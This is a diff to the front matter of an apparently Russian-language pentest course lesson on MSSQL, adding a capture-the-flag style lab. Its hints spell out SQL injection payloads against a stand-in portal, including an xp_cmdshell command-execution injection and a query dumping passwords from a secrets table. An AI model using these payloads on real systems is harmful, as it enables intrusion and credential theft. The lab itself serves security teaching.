@@ -13,6 +13,18 @@ useful_for:
   - "Пентест внутренних сетей"
 estimated_minutes: 45
 summary: "MSSQL от фингерпринта до RCE: sys.objects, WAITFOR, xp_cmdshell, OPENROWSET, linked servers и impacket mssqlclient."
+lab:
+  kind: shell
+  title: 'Практика: MSSQL — xp_cmdshell и дамп'
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: 'grep -q ''nto{'' found.txt'
+  hints:
+    - 'Диалект: `curl -s "http://portal.example/user?id=1''"` — `Unclosed quotation mark`.'
+    - 'Версия и пользователь: `@@version`, `system_user`; права — `is_srvrolemember(''sysadmin'')`.'
+    - 'RCE: `id=1;EXEC xp_cmdshell ''whoami''-- -`.'
+    - 'Флаг — в таблице `secrets`: `STRING_AGG(password,CHAR(10)) FROM secrets`.'
 ---
 
 ## Задача
